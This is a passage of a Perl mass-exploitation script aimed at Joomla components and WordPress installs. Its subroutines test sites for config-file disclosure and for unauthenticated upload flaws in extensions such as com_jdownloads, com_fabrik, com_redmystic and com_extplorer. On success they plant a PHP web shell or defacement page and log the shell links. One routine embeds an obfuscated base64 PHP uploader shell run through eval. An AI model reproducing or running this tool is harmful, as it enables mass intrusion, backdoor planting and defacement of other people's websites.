print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com trade ......................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/lang.php?mosConfig_absolute_path=";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_bayesiannaivefilter(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com bayesiannaivefilter ........... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/lang.php?mosConfig_absolute_path=";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_babackup(){           print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
   print color('bold white'),"com babackup ...................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/Tar.php?mosConfig_absolute_path=";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}

sub com_bsqsitestats(){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com bsqsitestats .................. ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/Tar.php?mosConfig_bsqsitestats_path=";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN	";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	##########################################################

################ comjdownloads #####################
sub comjdownloads(){
$file="cjd.rar";
$filez="Xploit.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/Xploit.php.j';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"justin lee", mail=>"ph.hitachi@gmail.com", filetitle =>"justin lee", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/X Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $shellpath\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$shellpath\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads";
print color('bold white')," .................... ";
print color('bold red'),"NOT VULN\n";
}
}


################ comjdownloads index #####################
sub comjdownloadsdef(){
$def = $site . '/images/jdownloads/screenshots/Xploit.html.j';
$filee="Xploithtml.rar";
$filezz="Xploit.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Justin lee", mail=>"spinningarrix@gmail.com", filetitle =>"Justin lee", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploitx->content =~ /The file was successfully transferred to the server/) {


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Jdownloads Index";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $def\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$def\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Jdownloads Index";
print color('bold white')," .............. ";
print color('bold red'),"NOT VULN\n";
        }
}
else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Jdownloads Index";
print color('bold white')," .............. ";
print color('bold red'),"NOT VULN\n";

}
}

################ comfabrik #####################
sub comfabrik(){
my $url = "$site/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1";
my $shell ="Xploit.php";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["userfile" => ["$shell"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
           
            );

$comfabrikupp="$site/media/Xploit.php";

$checkcomfabrikupp = $ua->get("$comfabrikupp")->content;
if($checkcomfabrikupp =~/X Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik";
print color('bold white')," ........................ ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $comfabrikupp?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$comfabrikupp?X=Xploit\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik";
print color('bold white')," ........................ ";
print color('bold red'),"NOT VULN\n";
}
}

################ comfabrik index #####################
sub comfabrikdef(){
my $url = "$site/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1";
my $index ="Xploit.html";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["userfile" => ["$index"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
           
            );

$comfabrikup="$site/media/Xploit.html";

$checkcomfabrikup = $ua->get("$comfabrikup")->content;
if($checkcomfabrikup =~/Powered by Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik Index";
print color('bold white')," .................. ";
print color('bold green'),"VULN\n";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $comfabrikup\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$comfabrikup\n";
close (TEXT);
$def = $comfabrikup;
zoneh();

}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik Index";
print color('bold white')," .................. ";
print color('bold red'),"NOT VULN\n";
}
}
################ comfabrik2 #####################
sub comfabrik2(){
my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
my $shell ="Xploit.php";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["file" => ["$shell"]]
           
            );

$comfabrikupp2="$site/Xploit.php";

$checkcomfabrikupp = $ua->get("$comfabrikupp2")->content;
if($checkcomfabrikupp =~/X Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik2";
print color('bold white')," ....................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $comfabrikupp2?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$comfabrikupp?X=Xploit\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik2";
print color('bold white')," ....................... ";
print color('bold red'),"NOT VULN\n";
}
}

################ comfabrik index2 #####################
sub comfabrikdef2(){
my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
my $index ="Xploit.html";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["file" => ["$index"]]
           
            );

$comfabrikup2="$site/Xploit.html";

$checkcomfabrikup = $ua->get("$comfabrikup2")->content;
if($checkcomfabrikup =~/Powered by Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik Index2";
print color('bold white')," ................. ";
print color('bold green'),"VULN\n";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $comfabrikup2\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$comfabrikup2\n";
close (TEXT);
$def = $comfabrikup2;
zoneh();


}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik2 Index";
print color('bold white')," ................. ";
print color('bold red'),"NOT VULN\n";
}
}


################ comadsmanager #####################
sub comadsmanager(){
my $url = "$site/index.php?option=com_adsmanager&task=upload&tmpl=component";

my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["Xploit1.jpg"], name => "ph.hitachi.html"]
           
            );

$comadsmanager="$site/tmp/plupload/ph.hitachi.html";

$checkcomadsmanagerup = $ua->get("$comadsmanager")->content;
if($checkcomadsmanagerup =~/Powered by Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Ads Manager";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $comadsmanager\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$comadsmanager\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Ads Manager";
print color('bold white')," ................... ";
print color('bold red'),"NOT VULN\n";
}
}

sub comblog(){

my $url = "$site/index.php?option=com_myblog&task=ajaxupload";
my $checkblog = $ua->get("$url")->content;
if($checkblog =~/has been uploaded/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Blog";
print color('bold white')," .......................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Exploit It It Manual\n";
    open(TEXT, '>>Result/Try manual.txt');   
    print TEXT "[blog] $site\n";   
    close(TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Blog";
print color('bold white')," .......................... ";
print color('bold red'),"NOT VULN\n";
}
}


sub comusers(){

my $url = "$site/index.php?option=com_users&view=registration";
my $checkomusers = $ua->get("$url")->content;
if($checkomusers =~/jform_email2-lbl/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Users";
print color('bold white')," ......................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Exploit It Manual\n";
    open(TEXT, '>>Result/Try manual.txt');   
    print TEXT "[Com Users] $site\n";   
    close(TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Users";
print color('bold white')," ......................... ";
print color('bold red'),"NOT VULN\n";
    }
}


################ mod_simplefileupload #####################
sub mod_simplefileupload(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);

$url ="$site/modules/mod_simplefileuploadv1.3/elements/udd.php";
$simplefileuploadsup= "$site/modules/mod_simplefileuploadv1.3/elements/Xploit.php";

my $shell ="Xploit.php";

my $response = $ua->post( $url, Content_Type => "multipart/form-data", Content => [ file=>["$shell"] , submit=>"Upload" ]);

$check = $ua->get($simplefileuploadsup)->content;
if ($check =~ /X Xploit/){
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"mod simplefileupload";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $simplefileuploadsup?X=Xploit\n\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$simplefileuploadsup?X=Xploit\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"mod simplefileupload";
print color('bold white')," .............. ";
print color('bold red'),"NOT VULN\n\n";
}
}


####################wp install Checker
sub wpinstallcheck(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
#/wp-admin/setup-config.php
#/wordpress/wp-admin/setup-config.php
#/wp-admin/setup-config.php
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Checking Wp Install ";
print color('bold white')," .............. ";


my $Xploitxy = $ua->get("$site/wp-admin/setup-config.php")->content;
my $Xploitxy2 = $ua->get("$site/wordpress/wp-admin/setup-config.php")->content;
my $Xploitxy3 = $ua->get("$site/wp-admin/setup-config.php")->content;

if($Xploitxy =~/Setup Configuration File/) {

    print color('bold green');
	    print  "[Found]\n ==> $site/wp-admin/setup-config.php\n";

    open(TEXT, '>>Result/wpinstall.txt');
    print TEXT "[Found] ==> $site/wp-admin/setup-config.php/n";
    close(TEXT);
    print color('reset');

}
    elsif ($Xploitxy2 =~/Setup Configuration File/){
    print color('bold green');
	    print  "[Found]\n ==> $site/wordpress/wp-admin/setup-config.php\n";

	    open(TEXT, '>>Result/wpinstall.txt');
    print TEXT "[Found] ==> $site/wordpress/wp-admin/setup-config.php\n";
    close(TEXT);
    print color('reset');

    } elsif ($Xploitxy3 =~/Setup Configuration File/){
    print color('bold green');
	    print  "[Found]\n ==> $site/wp-admin/setup-config.php\n";

	    open(TEXT, '>>Result/wpinstall.txt');
    print TEXT "[Found] ==> $site/wp-admin/setup-config.php\n";
    close(TEXT);
    print color('reset');

    }
else{
print color('bold red'),"NOT VULN\n\n";
    print color('reset');



        }
	
}
################ com_redmystic #####################
sub redmy(){
my $indexa='
<?php eval (base64_decode("ZWNobyAnPHRpdGxlPlNlY1hwbG9pdCB2MS4wIDwvdGl0bGU+JzsKZWNobyAnPGNlbnRlcj48aDE+U2VjWHBsb2l0IFVwbG9hZGVyPC9oMT48Y2VudGVyPic7CmlmKCRfR0VUWydYJ109PSJYcGxvaXQiKXsKZWNobyAiPGNlbnRlcj48Yj5VbmFtZToiLnBocF91bmFtZSgpLiI8L2I+IjsgCmVjaG8gJzxmb250IGNvbG9yPSJibGFjayIgc2l6ZT0iNCI+JzsKaWYoaXNzZXQoJF9QT1NUWydTdWJtaXQnXSkpewogICAgJGZpbGVkaXIgPSAiIjsgCiAgICAkbWF4ZmlsZSA9ICcyMDAwMDAwJzsKICAgICRtb2RlID0gJzA2NDQnOwogICAgJHVzZXJmaWxlX25hbWUgPSAkX0ZJTEVTWydpbWFnZSddWyduYW1lJ107CiAgICAkdXNlcmZpbGVfdG1wID0gJF9GSUxFU1snaW1hZ2UnXVsndG1wX25hbWUnXTsKICAgIGlmKGlzc2V0KCRfRklMRVNbJ2ltYWdlJ11bJ25hbWUnXSkpIHsKICAgICAgICAkcXggPSAkZmlsZWRpci4kdXNlcmZpbGVfbmFtZTsKICAgICAgICBAbW92ZV91cGxvYWRlZF9maWxlKCR1c2VyZmlsZV90bXAsICRxeCk7CiAgICAgICAgQGNobW9kICgkcXgsIG9jdGRlYygkbW9kZSkpOwplY2hvIiA8YSBocmVmPSR1c2VyZmlsZV9uYW1lPjxjZW50ZXI+PGI+U3VjZXNzIFVwbG9hZCAhISEgPT0+ICR1c2VyZmlsZV9uYW1lPC9iPjwvY2VudGVyPjwvYT4iOwp9Cn0KZWxzZXsKZWNobyc8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIyIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImltYWdlIj48YnI+PGlucHV0IHR5cGU9IlN1Ym1pdCIgbmFtZT0iU3VibWl0IiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsKfQplY2hvICc8L2NlbnRlcj48L2ZvbnQ+JzsKfQ")); ?>';

my $url = "$site/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php?name=add.php";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres = $ua->post($url, Content_Type => "multipart/form-data", Content => $indexa);

$gravityformsup = "$site/administrator/components/com_redmystic/chart/tmp-upload-images/add.php";
my $checkk = $ua->get("$site/administrator/components/com_redmystic/chart/tmp-upload-images/add.php")->content;
if($checkk =~/X Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com redmystic";
print color('bold white')," ..................... ";
print color('bold green'),"Done\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"    [LINK] => $gravityformsup?X=Xploit\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$gravityformsup?X=Xploit\n";
close (TEXT);
}
else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com redmystic";
print color('bold white')," ..................... ";
print color('red'),"NOT VULN";
print color('bold white'),"\n";
}
}
################################################################
sub rocks(){

my $url = "$site/administrator/components/com_rokdownloads/assets/uploadhandler.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => ['Filedata' => ["Xploit.jpg"], "jpath" => "..%2F..%2F..%2F..%2F" ]);

$sexyup="$site/images/stories/Xploit.jpg";

$checkpofxwup = $ua->get("$sexyup")->content;
if($checkpofxwup =~/X Xploit/) {		

  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"rokdownloads";
print color('bold white')," ....................... ";
print color('bold green'),"Done\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $uploadfolder\n";
    open(TEXT, '>>Result/shell.txt');   
print TEXT "$uploadfolder\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"rokdownloads";
print color('bold white')," ....................... ";
print color('red'),"NOT VULN\n";
}
}

################################################################
sub sujks(){

my $url = "$site/administrator/components/com_extplorer/uploadhandler.php";
my $shell ="Xploit.jpg";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );

$sexyup="$site/images/stories/Xploit.jpg";

$checkpofxwup = $ua->get("$sexyup")->content;
if($checkpofxwup =~/X Xploit/) {		

  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com extplorer";
print color('bold white')," ...................... ";
print color('bold green'),"Done\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"  shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $uploadfolder?X=Xploit\n";
open(TEXT, '>>Result/shell.txt');   
print TEXT "$uploadfolder?X=Xploit\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com extplorer";
print color('bold white')," ...................... ";
print color('red'),"NOT VULN\n";
}
}
################ com_jwallpapers fileupload #####################
sub facile(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);

$url ="$site/components/com_facileforms/libraries/jquery/uploadify.php";
$comjwallpapersup= "$site/components/com_facileforms/libraries/jquery/Xploit.php";

my $shell ="Xploit.php";

my $response = $ua->post( $url, Content_Type => "multipart/form-data", Content => [ Filedata=>["$shell"] , 'folder'=>'/components/com_facileforms/libraries/jquery/' ]);

$check = $ua->get($comjwallpapersup)->content;
if ($check =~ /X Xploit/){
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"comfacileforms";
print color('bold white')," ................. ";
print color('bold green'),"Done\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $comjwallpapersup?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$comjwallpapersup?X=Xploit\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"comfacileforms";
print color('bold white')," ..................... ";
print color('red'),"NOT VULN\n";
}
}
################ Proclaim 9.1.1 #####################
sub Proclaim(){
my $url = "$site/index.php?option=com_biblestudy&view=mediafileform&layout=edit&id=1";

my $shell ="Xploit.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$Proclaims="$site/images/biblestudy/media/Xploit.php";
my $checkfoxup = $ua->get("$Proclaims")->content;
if ($checkfoxup =~ /X Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Proclaim";
print color('bold white')," ...................... ";
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $Proclaims?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$Proclaims?X=Xploit\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Proclaim";
print color('bold white')," ...................... ";
print color('red'),"NOT VULN\n";
}}
################ Jimtawl 2.1.6 #####################
sub Jimtawl(){
my $url = "$site/index.php?option=com_jimtawl&view=upload&task=upload&pop=true&tmpl=component";

my $shell ="Xploit.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$Jimtawls="$site/media/Xploit.php";

my $checkfoxup = $ua->get("$Jimtawls")->content;
if ($checkfoxup =~ /X Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jimtawl";
print color('bold white')," ....................... ";
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $Jimtawls?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$Jimtawls?X=Xploit\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jimtawl";
print color('bold white')," ....................... ";
print color('red'),"NOT VULN\n";
}}
################ NovaSFH 3.0.2  #####################
sub NovaSFH(){
my $url = "$site/administrator/index.php?option=com_novasfh&c=uploader";

my $shell ="Xploit.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$NovaSFHs="$site/Xploit.php";

my $checkfoxup = $ua->get("$NovaSFHs")->content;
if ($checkfoxup =~ /X Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com NovaSFH";
print color('bold white')," ....................... ";
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $NovaSFHs?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$NovaSFHs?X=Xploit\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com NovaSFH";
print color('bold white')," ....................... ";
print color('red'),"NOT VULN\n";
}}
################ com_collector #####################
sub collector(){
my $url = "$site/index.php?option=com_collector&view=filelist&tmpl=component&folder=&type=1";

my $shell ="Xploit.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$collectors="$site/Xploit.php";

my $checkfoxup = $ua->get("$collectors")->content;
if ($checkfoxup =~ /X Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com collector";
print color('bold white')," ..................... ";
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $collectors?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$collectors?X=Xploit\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com collector";
print color('bold white')," ..................... ";
print color('red'),"NOT VULN\n";
}}
################ com_osproperty 2.0.2 #####################
sub osproperty(){
my $url = "$site/osproperty/?task=agent_register";

my $shell ="Xploit.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$ospropertys="$site/images/osproperty/agent/Xploit.php";

my $checkfoxup = $ua->get("$ospropertys")->content;
if ($checkfoxup =~ /X Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com osproperty";
print color('bold white')," .................... ";
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $ospropertys?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$ospropertys?X=Xploit\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com osproperty";
print color('bold white')," .................... ";
print color('red'),"NOT VULN\n";
}}
################ com_ksadvertiser #####################
sub ksadvertiser(){
my $url = "$site/index.php?option=com_ksadvertiser&Itemid=36&task=add&catid=0&lang=en";

my $shell ="Xploit.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$ksadvertisers="$site/images/ksadvertiser/U0/Xploit.php";

my $checkfoxup = $ua->get("$ksadvertisers")->content;
if ($checkfoxup =~ /X Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com ksadvertiser";
print color('bold white')," ................ ";
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $ksadvertisers?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$ksadvertisers?X=Xploit\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com ksadvertiser";
print color('bold white')," .................. ";
print color('red'),"NOT VULN\n";
}}
################ com_hwdvideoshare #####################
sub hwdvideoshare(){
my $url = "$site/com_hwdvideoshare/assets/uploads/flash/flash_upload.php?jqUploader=1";

my $shell ="Xploit.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$hwdvideoshares="$site/tmp/Xploit.php";

my $checkfoxup = $ua->get("$hwdvideoshares")->content;
if ($checkfoxup =~ /X Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com hwdvideoshare";
print color('bold white')," ................. ";
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $hwdvideoshares?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$hwdvideoshares?X=Xploit\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com hwdvideoshare";
print color('bold white')," ................. ";
print color('red'),"NOT VULN\n";
}}
################ mod_jfancy #####################
sub fancys(){
my $url = "$site/modules/mod_jfancy/script.php";

my $shell ="Xploit.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$fancyss="$site/images/Xploit.php";

my $checkfoxup = $ua->get("$fancyss")->content;
if ($checkfoxup =~ /X Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com fancys";
print color('bold white')," ........................ ";
print color('bold green'),"Done\n";
